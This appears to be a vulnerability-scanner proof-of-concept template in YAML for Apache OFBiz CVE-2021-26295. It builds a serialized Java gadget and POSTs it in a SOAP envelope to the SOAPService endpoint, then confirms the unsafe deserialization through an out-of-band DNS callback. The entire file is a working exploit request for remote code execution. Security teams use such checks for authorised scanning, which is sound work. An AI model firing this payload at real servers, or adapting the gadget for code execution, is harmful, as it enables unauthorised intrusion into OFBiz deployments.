tmp/apache/yaml-poc-apache-ofbiz-logical-CVE-2021-26295.yml

name: poc-yaml-apache-ofbiz-cve-2021-26295-rce
binding: 381ce462-a1c2-416c-bbab-3a29da971718
manual: true
detail:
    author: 小z
    links:
        - https://github.com/yumusb/CVE-2021-26295-POC
    vulnerability:
        level: critical
transport: http
set:
    reverse: newReverse()
    reverseDomain: reverse.domain
    s1: javaGadget("dns", reverseDomain, "url")
    s2: hex(s1)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /webtools/control/SOAPService
            headers:
                Content-Type: application/xml
            body: |-
                <?xml version='1.0' encoding='UTF-8'?>
                  <soapenv:Envelope
                    xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
                    <soapenv:Header/>
                      <soapenv:Body>
                        <ns1:clearAllEntityCaches xmlns:ns1="http://ofbiz.apache.org/service/">
                            <ns1:cus-obj>{{s2}}</ns1:cus-obj>
                        </ns1:clearAllEntityCaches>
                      </soapenv:Body>
                  </soapenv:Envelope>
            follow_redirects: false
        expression: reverse.wait(5)
expression: r0()
